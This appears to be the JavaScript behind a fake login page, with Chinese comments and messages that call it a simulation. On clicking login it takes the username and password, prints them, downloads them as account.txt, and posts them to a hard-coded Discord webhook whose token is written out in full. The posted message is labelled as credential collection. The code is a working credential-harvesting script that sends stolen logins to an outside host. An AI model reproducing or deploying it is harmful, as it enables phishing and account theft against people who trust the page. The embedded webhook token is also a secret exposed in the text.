document.addEventListener("DOMContentLoaded", () => {
    const loginButton = document.getElementById("login-button");

    loginButton.addEventListener("click", () => {
        const username = document.getElementById("login-username").value.trim();
        const password = document.getElementById("login-password").value;

        if (!username || !password) {
            alert("請輸入帳號與密碼！");
            return;
        }

        console.log("輸入的帳號:", username);
        console.log("輸入的密碼:", password);

        alert("登入成功！（模擬）\n帳號：" + username + "\n密碼：" + password);

        // 儲存為本地檔案
        const accountData = `帳號: ${username}\n密碼: ${password}\n`;
        const blob = new Blob([accountData], { type: 'text/plain' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = 'account.txt';
        link.click();

        // 傳送到 Discord Webhook
        const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";

        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: `📥 模擬帳密收集\n👤 帳號：${username}\n🔐 密碼：${password}`
            }),
        }).then(() => {
            console.log("已送出至 Discord Webhook");
        }).catch((error) => {
            console.error("Webhook 傳送失敗：", error);
        });
    });
});
